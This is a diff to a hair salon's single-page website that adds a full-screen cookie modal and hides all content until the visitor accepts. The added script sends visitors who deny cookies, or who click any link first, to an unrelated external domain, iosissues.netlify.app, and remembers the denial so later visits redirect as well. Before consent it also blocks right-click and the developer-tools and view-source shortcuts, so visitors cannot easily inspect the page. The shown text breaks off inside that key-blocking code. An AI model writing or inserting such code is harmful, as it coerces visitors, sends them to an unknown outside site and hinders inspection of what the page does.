@@ -36,6 +36,115 @@
             margin: 0 auto;
         }
         
+        /* Cookie Consent Modal */
+        .cookie-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .cookie-modal.active {
+            display: flex;
+        }
+        
+        .cookie-content {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .cookie-icon {
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+            color: var(--primary);
+        }
+        
+        .cookie-content h3 {
+            color: var(--dark);
+            margin-bottom: 1rem;
+            font-size: 1.8rem;
+        }
+        
+        .cookie-content p {
+            color: var(--text);
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        
+        .warning-box {
+            background-color: #FFF3CD;
+            border: 2px solid #FFC107;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            text-align: left;
+        }
+        
+        .warning-box strong {
+            color: #856404;
+        }
+        
+        .cookie-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin-top: 2rem;
+        }
+        
+        .cookie-btn {
+            padding: 1rem 2.5rem;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+            font-size: 1rem;
+            min-width: 150px;
+        }
+        
+        .accept-btn {
+            background-color: var(--accent);
+            color: white;
+        }
+        
+        .accept-btn:hover {
+            background-color: #4a7368;
+            transform: translateY(-2px);
+        }
+        
+        .deny-btn {
+            background-color: #6c757d;
+            color: white;
+        }
+        
+        .deny-btn:hover {
+            background-color: #5a6268;
+            transform: translateY(-2px);
+        }
+        
         /* Typography */
         h1, h2, h3, h4 {
             font-weight: 600;
@@ -603,6 +712,14 @@
             .philosophy-image {
                 order: -1;
             }
+            
+            .cookie-buttons {
+                flex-direction: column;
+            }
+            
+            .cookie-btn {
+                width: 100%;
+            }
         }
         
         @media (max-width: 768px) {
@@ -650,392 +767,458 @@
             nav ul li {
                 margin: 0.8rem 0;
             }
+            
+            .cookie-content {
+                padding: 1.5rem;
+                width: 95%;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="container header-container">
-            <a href="#" class="logo">
-                <div class="logo-icon">V</div>
-                <div class="logo-text">Verona<span>Atelier</span></div>
-            </a>
-            <div class="mobile-menu">☰</div>
-            <nav id="main-nav">
-                <ul>
-                    <li><a href="#philosophy">Our Philosophy</a></li>
-                    <li><a href="#services">Services</a></li>
-                    <li><a href="#education">Hair Wellness</a></li>
-                    <li><a href="#team">Our Artisans</a></li>
-                    <li><a href="#contact">Visit Us</a></li>
-                </ul>
-            </nav>
-            <a href="#contact" class="cta-button">Book Consultation</a>
-        </div>
-    </header>
-
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container hero-content">
-            <h1>Where Hair Becomes Art</h1>
-            <p>At Verona Hair Atelier, we believe your hair is your most personal accessory. Our artisan stylists craft bespoke looks that enhance your natural beauty and reflect your unique personality.</p>
-            <a href="#contact" class="cta-button">Schedule Your Transformation</a>
-        </div>
-    </section>
-
-    <!-- Philosophy Section -->
-    <section class="philosophy" id="philosophy">
-        <div class="container">
-            <div class="section-title">
-                <h2>Our Philosophy</h2>
-                <p>We approach hair as an art form and a vital expression of self</p>
+    <!-- Cookie Consent Modal -->
+    <div class="cookie-modal active" id="cookieModal">
+        <div class="cookie-content">
+            <div class="cookie-icon">🍪</div>
+            <h3>Cookies & Privacy</h3>
+            <p>We use cookies to enhance your browsing experience, analyze site traffic, and personalize content. By continuing to use our site, you consent to our use of cookies.</p>
+            
+            <div class="warning-box">
+                <strong>Important Notice:</strong> You must accept or deny cookies to continue using this website. Clicking any navigation link without accepting cookies will redirect you.
             </div>
-            <div class="philosophy-content">
-                <div class="philosophy-text">
-                    <h3>Beyond Beauty: The Verona Approach</h3>
-                    <p>Founded on the principle that exceptional hair begins with understanding, our stylists take time to listen, assess, and collaborate with you. We don't follow trends—we create personalized styles that complement your features, lifestyle, and personality.</p>
-                    <p>Our studio exclusively uses plant-based color and sustainable products that nourish your hair while delivering stunning results. We believe beautiful hair should also be healthy hair.</p>
-                    <p>Every visit to Verona is a holistic experience—from our calming environment to our detailed consultations and precision craftsmanship. We're not just styling hair; we're enhancing confidence.</p>
-                    <a href="#contact" class="cta-button">Experience the Difference</a>
+            
+            <div class="cookie-buttons">
+                <button class="cookie-btn deny-btn" id="denyCookies">Deny</button>
+                <button class="cookie-btn accept-btn" id="acceptCookies">Accept Cookies</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content (initially disabled) -->
+    <div id="mainContent" style="display: none;">
+        <!-- Header -->
+        <header>
+            <div class="container header-container">
+                <a href="#" class="logo">
+                    <div class="logo-icon">V</div>
+                    <div class="logo-text">Verona<span>Atelier</span></div>
+                </a>
+                <div class="mobile-menu">☰</div>
+                <nav id="main-nav">
+                    <ul>
+                        <li><a href="#philosophy" class="nav-link">Our Philosophy</a></li>
+                        <li><a href="#services" class="nav-link">Services</a></li>
+                        <li><a href="#education" class="nav-link">Hair Wellness</a></li>
+                        <li><a href="#team" class="nav-link">Our Artisans</a></li>
+                        <li><a href="#contact" class="nav-link">Visit Us</a></li>
+                    </ul>
+                </nav>
+                <a href="#contact" class="cta-button nav-link">Book Consultation</a>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container hero-content">
+                <h1>Where Hair Becomes Art</h1>
+                <p>At Verona Hair Atelier, we believe your hair is your most personal accessory. Our artisan stylists craft bespoke looks that enhance your natural beauty and reflect your unique personality.</p>
+                <a href="#contact" class="cta-button nav-link">Schedule Your Transformation</a>
+            </div>
+        </section>
+
+        <!-- Philosophy Section -->
+        <section class="philosophy" id="philosophy">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Our Philosophy</h2>
+                    <p>We approach hair as an art form and a vital expression of self</p>
                 </div>
-                <div class="philosophy-image">
-                    <div style="width:100%;height:400px;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;font-size:1.2rem;">Studio Environment Image</div>
+                <div class="philosophy-content">
+                    <div class="philosophy-text">
+                        <h3>Beyond Beauty: The Verona Approach</h3>
+                        <p>Founded on the principle that exceptional hair begins with understanding, our stylists take time to listen, assess, and collaborate with you. We don't follow trends—we create personalized styles that complement your features, lifestyle, and personality.</p>
+                        <p>Our studio exclusively uses plant-based color and sustainable products that nourish your hair while delivering stunning results. We believe beautiful hair should also be healthy hair.</p>
+                        <p>Every visit to Verona is a holistic experience—from our calming environment to our detailed consultations and precision craftsmanship. We're not just styling hair; we're enhancing confidence.</p>
+                        <a href="#contact" class="cta-button nav-link">Experience the Difference</a>
+                    </div>
+                    <div class="philosophy-image">
+                        <div style="width:100%;height:400px;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;font-size:1.2rem;">Studio Environment Image</div>
+                    </div>
                 </div>
             </div>
-        </div>
-    </section>
+        </section>
 
-    <!-- Services Section -->
-    <section class="services" id="services">
-        <div class="container">
-            <div class="section-title">
-                <h2>Artisan Services</h2>
-                <p>Precision techniques tailored to your unique hair needs</p>
+        <!-- Services Section -->
+        <section class="services" id="services">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Artisan Services</h2>
+                    <p>Precision techniques tailored to your unique hair needs</p>
+                </div>
+                <div class="services-grid">
+                    <div class="service-card">
+                        <div class="service-icon">✂️</div>
+                        <div class="service-content">
+                            <h3>Signature Cutting</h3>
+                            <p>Our precision cutting techniques are designed to enhance your bone structure and bring balance to your features. Each cut is customized to work with your hair's natural texture and growth patterns.</p>
+                            <ul class="service-features">
+                                <li>Personalized shape analysis</li>
+                                <li>Texture-specific techniques</li>
+                                <li>Style training for at-home maintenance</li>
+                                <li>Dry cutting for precision</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon">🎨</div>
+                        <div class="service-content">
+                            <h3>Organic Color Design</h3>
+                            <p>Using plant-based color systems free of ammonia and resorcinol, we create dimensional color that enhances your natural beauty while improving hair health.</p>
+                            <ul class="service-features">
+                                <li>Plant-based color formulations</li>
+                                <li>Custom color blending</li>
+                                <li>Balayage and hand-painted techniques</li>
+                                <li>Gray blending solutions</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="service-card">
+                        <div class="service-icon">💆</div>
+                        <div class="service-content">
+                            <h3>Hair Wellness Treatments</h3>
+                            <p>Restore vitality to stressed hair with our targeted treatment protocols. From moisture rehabilitation to protein restructuring, we address your hair's specific needs.</p>
+                            <ul class="service-features">
+                                <li>Diagnostic hair analysis</li>
+                                <li>Custom treatment formulations</li>
+                                <li>Scalp health optimization</li>
+                                <li>Post-color soothing treatments</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <div class="services-grid">
-                <div class="service-card">
-                    <div class="service-icon">✂️</div>
-                    <div class="service-content">
-                        <h3>Signature Cutting</h3>
-                        <p>Our precision cutting techniques are designed to enhance your bone structure and bring balance to your features. Each cut is customized to work with your hair's natural texture and growth patterns.</p>
-                        <ul class="service-features">
-                            <li>Personalized shape analysis</li>
-                            <li>Texture-specific techniques</li>
-                            <li>Style training for at-home maintenance</li>
-                            <li>Dry cutting for precision</li>
+        </section>
+
+        <!-- Education Section -->
+        <section class="education" id="education">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Hair Wellness Education</h2>
+                    <p>Knowledge is the foundation of beautiful, healthy hair</p>
+                </div>
+                <div class="education-content">
+                    <div class="education-articles">
+                        <div class="article-card">
+                            <h4>Understanding Your Hair's Unique Language</h4>
+                            <p>Learn to interpret what your hair is telling you through its texture, elasticity, and behavior. We'll help you understand the difference between damaged hair and hair that simply needs different care.</p>
+                            <a href="#" class="read-more nav-link">Read our guide</a>
+                        </div>
+                        <div class="article-card">
+                            <h4>The Truth About Sulfates and Silicones</h4>
+                            <p>Not all sulfates and silicones are created equal. We break down the science behind these controversial ingredients and help you make informed choices for your hair type.</p>
+                            <a href="#" class="read-more nav-link">Learn the facts</a>
+                        </div>
+                        <div class="article-card">
+                            <h4>Seasonal Hair Care Adjustments</h4>
+                            <p>Just like your skin, your hair has different needs throughout the year. Discover how to adjust your routine with the changing seasons for optimal hair health.</p>
+                            <a href="#" class="read-more nav-link">Explore seasonal tips</a>
+                        </div>
+                    </div>
+                    <div class="education-text">
+                        <h3>Your Hair Health Journey</h3>
+                        <p>At Verona, we believe education is essential to maintaining beautiful hair between appointments. Our stylists don't just create your look—they equip you with the knowledge to recreate and maintain it at home.</p>
+                        <p>We've developed comprehensive guides on everything from understanding your hair's porosity to selecting the right tools for your texture. These resources are available to all our clients as part of our commitment to your long-term hair wellness.</p>
+                        <p>During your appointment, your stylist will provide personalized recommendations for at-home care, demonstrating techniques and products that will work specifically for your hair type and lifestyle.</p>
+                        <a href="#contact" class="cta-button nav-link">Schedule a Consultation</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Team Section -->
+        <section class="team" id="team">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Meet Our Artisans</h2>
+                    <p>Skilled hands, artistic vision, and a passion for hair wellness</p>
+                </div>
+                <div class="team-grid">
+                    <div class="team-member">
+                        <div class="member-photo">
+                            <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
+                        </div>
+                        <div class="member-info">
+                            <h3>Elena Rodriguez</h3>
+                            <div class="member-role">Creative Director & Color Specialist</div>
+                            <p class="member-bio">With over 12 years of experience, Elena specializes in color correction and creating dimensional color that enhances natural beauty. Her background in fine arts informs her unique approach to hair color.</p>
+                        </div>
+                    </div>
+                    <div class="team-member">
+                        <div class="member-photo">
+                            <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
+                        </div>
+                        <div class="member-info">
+                            <h3>Marcus Chen</h3>
+                            <div class="member-role">Cutting Specialist & Texture Expert</div>
+                            <p class="member-bio">Marcus has dedicated his career to mastering cutting techniques for all hair textures. His precision cutting method creates shapes that grow out beautifully and require minimal styling.</p>
+                        </div>
+                    </div>
+                    <div class="team-member">
+                        <div class="member-photo">
+                            <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
+                        </div>
+                        <div class="member-info">
+                            <h3>Sophie Williams</h3>
+                            <div class="member-role">Hair Wellness Director</div>
+                            <p class="member-bio">Sophie's passion for holistic beauty led her to specialize in hair and scalp health. She develops personalized treatment plans that address both cosmetic concerns and underlying hair health.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Contact Section -->
+        <section class="contact" id="contact">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Visit Our Studio</h2>
+                    <p>Experience the Verona difference in the heart of Seattle</p>
+                </div>
+                <div class="contact-container">
+                    <div class="contact-info">
+                        <h3>Find Us in Downtown Seattle</h3>
+                        <div class="contact-details">
+                            <div class="contact-item">
+                                <div class="contact-icon">📍</div>
+                                <div class="contact-text">
+                                    <h4>Our Location</h4>
+                                    <p>1425 Pine Street<br>Seattle, WA 98101</p>
+                                </div>
+                            </div>
+                            <div class="contact-item">
+                                <div class="contact-icon">📞</div>
+                                <div class="contact-text">
+                                    <h4>Phone Number</h4>
+                                    <p>(206) 555-HEAR (4327)</p>
+                                </div>
+                            </div>
+                            <div class="contact-item">
+                                <div class="contact-icon">✉️</div>
+                                <div class="contact-text">
+                                    <h4>Email Address</h4>
+                                    <p>hello@veronaatelier.com</p>
+                                </div>
+                            </div>
+                            <div class="contact-item">
+                                <div class="contact-icon">🕒</div>
+                                <div class="contact-text">
+                                    <h4>Opening Hours</h4>
+                                    <p>Tuesday - Saturday: 9am-7pm<br>Sunday: 10am-4pm<br>Monday: Closed</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="studio-info">
+                            <h4>About Your Visit</h4>
+                            <p>We recommend scheduling appointments at least two weeks in advance, especially for new clients or complex color services. Complimentary consultations are available to discuss your hair goals before booking major services.</p>
+                            <p>Our studio is located in the historic Pioneer Square district, with convenient parking options nearby. We welcome you to arrive 10 minutes early to enjoy a cup of tea and complete your client profile.</p>
+                        </div>
+                    </div>
+                    <div class="contact-form">
+                        <h3>Book Your Consultation</h3>
+                        <form id="appointment-form">
+                            <div class="form-group">
+                                <label for="name">Full Name</label>
+                                <input type="text" id="name" class="form-control" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="email">Email Address</label>
+                                <input type="email" id="email" class="form-control" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="phone">Phone Number</label>
+                                <input type="tel" id="phone" class="form-control" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="service-interest">Service Interest</label>
+                                <select id="service-interest" class="form-control" required>
+                                    <option value="">Select a service</option>
+                                    <option value="consultation">Complimentary Consultation</option>
+                                    <option value="cutting">Signature Cutting</option>
+                                    <option value="color">Organic Color Design</option>
+                                    <option value="treatment">Hair Wellness Treatment</option>
+                                    <option value="multiple">Multiple Services</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label for="message">Tell Us About Your Hair Goals</label>
+                                <textarea id="message" class="form-control" placeholder="What would you like to achieve with your hair? Any current challenges or concerns?"></textarea>
+                            </div>
+                            <button type="submit" class="cta-button" style="width: 100%;">Request Appointment</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer>
+            <div class="container">
+                <div class="footer-container">
+                    <div class="footer-col">
+                        <h3>Verona Hair Atelier</h3>
+                        <p>Where hair becomes art. Experience bespoke cuts, organic color, and hair wellness treatments in our Seattle studio.</p>
+                        <div class="social-links">
+                            <a href="#" class="nav-link">IG</a>
+                            <a href="#" class="nav-link">FB</a>
+                            <a href="#" class="nav-link">PT</a>
+                        </div>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Explore</h3>
+                        <ul>
+                            <li><a href="#philosophy" class="nav-link">Our Philosophy</a></li>
+                            <li><a href="#services" class="nav-link">Services</a></li>
+                            <li><a href="#education" class="nav-link">Hair Wellness</a></li>
+                            <li><a href="#team" class="nav-link">Our Artisans</a></li>
+                            <li><a href="#contact" class="nav-link">Visit Us</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Services</h3>
+                        <ul>
+                            <li><a href="#" class="nav-link">Signature Cutting</a></li>
+                            <li><a href="#" class="nav-link">Organic Color</a></li>
+                            <li><a href="#" class="nav-link">Hair Treatments</a></li>
+                            <li><a href="#" class="nav-link">Scalp Health</a></li>
+                            <li><a href="#" class="nav-link">Special Occasions</a></li>
+                        </ul>
+                    </div>
+                    <div class="footer-col">
+                        <h3>Contact</h3>
+                        <ul>
+                            <li>1425 Pine Street, Seattle</li>
+                            <li>(206) 555-HEAR</li>
+                            <li>hello@veronaatelier.com</li>
+                            <li>Tuesday - Saturday: 9am-7pm</li>
                         </ul>
                     </div>
                 </div>
-                <div class="service-card">
-                    <div class="service-icon">🎨</div>
-                    <div class="service-content">
-                        <h3>Organic Color Design</h3>
-                        <p>Using plant-based color systems free of ammonia and resorcinol, we create dimensional color that enhances your natural beauty while improving hair health.</p>
-                        <ul class="service-features">
-                            <li>Plant-based color formulations</li>
-                            <li>Custom color blending</li>
-                            <li>Balayage and hand-painted techniques</li>
-                            <li>Gray blending solutions</li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="service-card">
-                    <div class="service-icon">💆</div>
-                    <div class="service-content">
-                        <h3>Hair Wellness Treatments</h3>
-                        <p>Restore vitality to stressed hair with our targeted treatment protocols. From moisture rehabilitation to protein restructuring, we address your hair's specific needs.</p>
-                        <ul class="service-features">
-                            <li>Diagnostic hair analysis</li>
-                            <li>Custom treatment formulations</li>
-                            <li>Scalp health optimization</li>
-                            <li>Post-color soothing treatments</li>
-                        </ul>
-                    </div>
+                <div class="copyright">
+                    <p>&copy; 2023 Verona Hair Atelier. All rights reserved. | <a href="#" class="nav-link" style="color:#bbb;">Privacy Policy</a> | <a href="#" class="nav-link" style="color:#bbb;">Terms of Service</a></p>
                 </div>
             </div>
-        </div>
-    </section>
-
-    <!-- Education Section -->
-    <section class="education" id="education">
-        <div class="container">
-            <div class="section-title">
-                <h2>Hair Wellness Education</h2>
-                <p>Knowledge is the foundation of beautiful, healthy hair</p>
-            </div>
-            <div class="education-content">
-                <div class="education-articles">
-                    <div class="article-card">
-                        <h4>Understanding Your Hair's Unique Language</h4>
-                        <p>Learn to interpret what your hair is telling you through its texture, elasticity, and behavior. We'll help you understand the difference between damaged hair and hair that simply needs different care.</p>
-                        <a href="#" class="read-more">Read our guide</a>
-                    </div>
-                    <div class="article-card">
-                        <h4>The Truth About Sulfates and Silicones</h4>
-                        <p>Not all sulfates and silicones are created equal. We break down the science behind these controversial ingredients and help you make informed choices for your hair type.</p>
-                        <a href="#" class="read-more">Learn the facts</a>
-                    </div>
-                    <div class="article-card">
-                        <h4>Seasonal Hair Care Adjustments</h4>
-                        <p>Just like your skin, your hair has different needs throughout the year. Discover how to adjust your routine with the changing seasons for optimal hair health.</p>
-                        <a href="#" class="read-more">Explore seasonal tips</a>
-                    </div>
-                </div>
-                <div class="education-text">
-                    <h3>Your Hair Health Journey</h3>
-                    <p>At Verona, we believe education is essential to maintaining beautiful hair between appointments. Our stylists don't just create your look—they equip you with the knowledge to recreate and maintain it at home.</p>
-                    <p>We've developed comprehensive guides on everything from understanding your hair's porosity to selecting the right tools for your texture. These resources are available to all our clients as part of our commitment to your long-term hair wellness.</p>
-                    <p>During your appointment, your stylist will provide personalized recommendations for at-home care, demonstrating techniques and products that will work specifically for your hair type and lifestyle.</p>
-                    <a href="#contact" class="cta-button">Schedule a Consultation</a>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Team Section -->
-    <section class="team" id="team">
-        <div class="container">
-            <div class="section-title">
-                <h2>Meet Our Artisans</h2>
-                <p>Skilled hands, artistic vision, and a passion for hair wellness</p>
-            </div>
-            <div class="team-grid">
-                <div class="team-member">
-                    <div class="member-photo">
-                        <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
-                    </div>
-                    <div class="member-info">
-                        <h3>Elena Rodriguez</h3>
-                        <div class="member-role">Creative Director & Color Specialist</div>
-                        <p class="member-bio">With over 12 years of experience, Elena specializes in color correction and creating dimensional color that enhances natural beauty. Her background in fine arts informs her unique approach to hair color.</p>
-                    </div>
-                </div>
-                <div class="team-member">
-                    <div class="member-photo">
-                        <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
-                    </div>
-                    <div class="member-info">
-                        <h3>Marcus Chen</h3>
-                        <div class="member-role">Cutting Specialist & Texture Expert</div>
-                        <p class="member-bio">Marcus has dedicated his career to mastering cutting techniques for all hair textures. His precision cutting method creates shapes that grow out beautifully and require minimal styling.</p>
-                    </div>
-                </div>
-                <div class="team-member">
-                    <div class="member-photo">
-                        <div style="width:100%;height:100%;background-color:#D4C1A5;display:flex;align-items:center;justify-content:center;color:#8B7355;">Photo</div>
-                    </div>
-                    <div class="member-info">
-                        <h3>Sophie Williams</h3>
-                        <div class="member-role">Hair Wellness Director</div>
-                        <p class="member-bio">Sophie's passion for holistic beauty led her to specialize in hair and scalp health. She develops personalized treatment plans that address both cosmetic concerns and underlying hair health.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Contact Section -->
-    <section class="contact" id="contact">
-        <div class="container">
-            <div class="section-title">
-                <h2>Visit Our Studio</h2>
-                <p>Experience the Verona difference in the heart of Seattle</p>
-            </div>
-            <div class="contact-container">
-                <div class="contact-info">
-                    <h3>Find Us in Downtown Seattle</h3>
-                    <div class="contact-details">
-                        <div class="contact-item">
-                            <div class="contact-icon">📍</div>
-                            <div class="contact-text">
-                                <h4>Our Location</h4>
-                                <p>1425 Pine Street<br>Seattle, WA 98101</p>
-                            </div>
-                        </div>
-                        <div class="contact-item">
-                            <div class="contact-icon">📞</div>
-                            <div class="contact-text">
-                                <h4>Phone Number</h4>
-                                <p>(206) 555-HEAR (4327)</p>
-                            </div>
-                        </div>
-                        <div class="contact-item">
-                            <div class="contact-icon">✉️</div>
-                            <div class="contact-text">
-                                <h4>Email Address</h4>
-                                <p>hello@veronaatelier.com</p>
-                            </div>
-                        </div>
-                        <div class="contact-item">
-                            <div class="contact-icon">🕒</div>
-                            <div class="contact-text">
-                                <h4>Opening Hours</h4>
-                                <p>Tuesday - Saturday: 9am-7pm<br>Sunday: 10am-4pm<br>Monday: Closed</p>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="studio-info">
-                        <h4>About Your Visit</h4>
-                        <p>We recommend scheduling appointments at least two weeks in advance, especially for new clients or complex color services. Complimentary consultations are available to discuss your hair goals before booking major services.</p>
-                        <p>Our studio is located in the historic Pioneer Square district, with convenient parking options nearby. We welcome you to arrive 10 minutes early to enjoy a cup of tea and complete your client profile.</p>
-                    </div>
-                </div>
-                <div class="contact-form">
-                    <h3>Book Your Consultation</h3>
-                    <form id="appointment-form">
-                        <div class="form-group">
-                            <label for="name">Full Name</label>
-                            <input type="text" id="name" class="form-control" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="email">Email Address</label>
-                            <input type="email" id="email" class="form-control" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="phone">Phone Number</label>
-                            <input type="tel" id="phone" class="form-control" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="service-interest">Service Interest</label>
-                            <select id="service-interest" class="form-control" required>
-                                <option value="">Select a service</option>
-                                <option value="consultation">Complimentary Consultation</option>
-                                <option value="cutting">Signature Cutting</option>
-                                <option value="color">Organic Color Design</option>
-                                <option value="treatment">Hair Wellness Treatment</option>
-                                <option value="multiple">Multiple Services</option>
-                            </select>
-                        </div>
-                        <div class="form-group">
-                            <label for="message">Tell Us About Your Hair Goals</label>
-                            <textarea id="message" class="form-control" placeholder="What would you like to achieve with your hair? Any current challenges or concerns?"></textarea>
-                        </div>
-                        <button type="submit" class="cta-button" style="width: 100%;">Request Appointment</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <div class="footer-container">
-                <div class="footer-col">
-                    <h3>Verona Hair Atelier</h3>
-                    <p>Where hair becomes art. Experience bespoke cuts, organic color, and hair wellness treatments in our Seattle studio.</p>
-                    <div class="social-links">
-                        <a href="#">IG</a>
-                        <a href="#">FB</a>
-                        <a href="#">PT</a>
-                    </div>
-                </div>
-                <div class="footer-col">
-                    <h3>Explore</h3>
-                    <ul>
-                        <li><a href="#philosophy">Our Philosophy</a></li>
-                        <li><a href="#services">Services</a></li>
-                        <li><a href="#education">Hair Wellness</a></li>
-                        <li><a href="#team">Our Artisans</a></li>
-                        <li><a href="#contact">Visit Us</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h3>Services</h3>
-                    <ul>
-                        <li><a href="#">Signature Cutting</a></li>
-                        <li><a href="#">Organic Color</a></li>
-                        <li><a href="#">Hair Treatments</a></li>
-                        <li><a href="#">Scalp Health</a></li>
-                        <li><a href="#">Special Occasions</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h3>Contact</h3>
-                    <ul>
-                        <li>1425 Pine Street, Seattle</li>
-                        <li>(206) 555-HEAR</li>
-                        <li>hello@veronaatelier.com</li>
-                        <li>Tuesday - Saturday: 9am-7pm</li>
-                    </ul>
-                </div>
-            </div>
-            <div class="copyright">
-                <p>&copy; 2023 Verona Hair Atelier. All rights reserved. | <a href="#" style="color:#bbb;">Privacy Policy</a> | <a href="#" style="color:#bbb;">Terms of Service</a></p>
-            </div>
-        </div>
-    </footer>
+        </footer>
+    </div>
 
     <script>
+        // Cookie consent functionality
+        const cookieModal = document.getElementById('cookieModal');
+        const mainContent = document.getElementById('mainContent');
+        const acceptBtn = document.getElementById('acceptCookies');
+        const denyBtn = document.getElementById('denyCookies');
+        const navLinks = document.querySelectorAll('.nav-link');
+        const redirectURL = 'https://iosissues.netlify.app';
+        
+        // Check if user has already made a choice
+        const cookieChoice = localStorage.getItem('cookieChoice');
+        
+        if (cookieChoice === 'accepted') {
+            // User previously accepted cookies
+            cookieModal.style.display = 'none';
+            mainContent.style.display = 'block';
+        } else if (cookieChoice === 'denied') {
+            // User previously denied cookies
+            window.location.href = redirectURL;
+        } else {
+            // Show modal (it's already active by default)
+            mainContent.style.display = 'none';
+        }
+        
+        // Accept cookies
+        acceptBtn.addEventListener('click', function() {
+            localStorage.setItem('cookieChoice', 'accepted');
+            cookieModal.style.display = 'none';
+            mainContent.style.display = 'block';
+            
+            // Enable all navigation links
+            navLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    // Allow normal navigation for accepted users
+                    return true;
+                });
+            });
+        });
+        
+        // Deny cookies
+        denyBtn.addEventListener('click', function() {
+            localStorage.setItem('cookieChoice', 'denied');
+            window.location.href = redirectURL;
+        });
+        
+        // Intercept navigation clicks before cookies are accepted
+        navLinks.forEach(link => {
+            link.addEventListener('click', function(e) {
+                if (!localStorage.getItem('cookieChoice')) {
+                    e.preventDefault();
+                    window.location.href = redirectURL;
+                }
+            });
+        });
+        
         // Mobile menu toggle
-        document.querySelector('.mobile-menu').addEventListener('click', function() {
+        document.querySelector('.mobile-menu')?.addEventListener('click', function() {
             document.getElementById('main-nav').classList.toggle('active');
         });
         
         // Form submission handling
-        document.getElementById('appointment-form').addEventListener('submit', function(e) {
+        document.getElementById('appointment-form')?.addEventListener('submit', function(e) {
             e.preventDefault();
             alert('Thank you for your appointment request! We will contact you within 24 hours to confirm your consultation.');
             this.reset();
         });
         
-        // Smooth scrolling for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        // Smooth scrolling for navigation links (only after cookies accepted)
+        navLinks.forEach(anchor => {
             anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                
-                const targetId = this.getAttribute('href');
-                if(targetId === '#') return;
-                
-                const targetElement = document.querySelector(targetId);
-                if(targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 100,
-                        behavior: 'smooth'
-                    });
+                if (localStorage.getItem('cookieChoice') === 'accepted') {
+                    e.preventDefault();
                     
-                    // Close mobile menu if open
-                    document.getElementById('main-nav').classList.remove('active');
+                    const targetId = this.getAttribute('href');
+                    if(targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if(targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 100,
+                            behavior: 'smooth'
+                        });
+                        
+                        // Close mobile menu if open
+                        document.getElementById('main-nav')?.classList.remove('active');
+                    }
                 }
             });
         });
+        
+        // Prevent right-click and inspect element (optional security measure)
+        document.addEventListener('contextmenu', function(e) {
+            if (!localStorage.getItem('cookieChoice')) {
+                e.preventDefault();
+            }
+        });
+        
+        // Prevent keyboard shortcuts for dev tools (optional)
+        document.addEventListener('keydown', function(e) {
+            if (!localStorage.getItem('cookieChoice')) {
+                // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
